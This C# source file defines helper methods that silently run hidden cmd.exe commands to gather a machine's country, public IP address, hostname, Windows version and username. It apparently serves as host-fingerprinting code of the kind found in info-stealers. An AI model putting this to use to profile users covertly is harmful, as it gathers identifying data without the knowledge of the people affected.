using System.Diagnostics;
using System.Text.RegularExpressions;

namespace ScrapeInformations
{
    internal class ScrapeInformationsFuncs
    {

        public string ProcessBase(string output, string command)
        {
            Process process = new Process();

            process.StartInfo = new ProcessStartInfo("cmd.exe", "/C" + command)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

            process.Start();
            string result = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return result.Replace("\n", "").Replace("\r", "");
        }

        public string GetCountry()
        {
            string country = "";
            country = ProcessBase(country, "curl https://ipinfo.io/country");
            return country.Replace("\n", "").Replace("\r", "");
        }

        public string GetIP()
        {
            string ipAddress = "";
            ipAddress  = ProcessBase(ipAddress, "curl https://api.ipify.org?format=json");
            ipAddress = Regex.Replace(ipAddress, "[^0-9.]", "");
            return ipAddress.Replace("\n", "").Replace("\r", "");
        }

        public string GetMachineName()
        {
            string machineName = "";
            machineName = ProcessBase(machineName, "hostname");
            return machineName.Replace("\n", "").Replace("\r", "");
        }

        public string GetOperatingSystem()
        {
            string operatingSystem = "";
            operatingSystem = ProcessBase(operatingSystem, "ver");
            return operatingSystem.Replace("\n", "").Replace("\r", "");
        }

        public string GetClientName()
        {
            string clientName = "";
            clientName = ProcessBase(clientName, "echo %username%").Replace("\n", "");
            return clientName.Replace("\n", "").Replace("\r", "");
        }

    }
}
